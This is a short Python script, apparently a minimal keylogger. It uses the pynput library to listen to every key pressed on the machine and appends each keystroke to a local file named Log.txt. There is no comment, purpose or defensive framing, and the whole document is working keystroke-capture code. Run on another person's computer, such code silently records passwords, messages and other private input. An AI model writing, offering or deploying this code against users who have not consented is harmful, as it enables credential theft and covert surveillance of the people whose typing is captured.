from pynput.keyboard import Listener

def writetofile(key):
    with open("Log.txt", 'a') as f:
        f.write(str(key))

with Listener(on_press=writetofile) as l:
    l.join()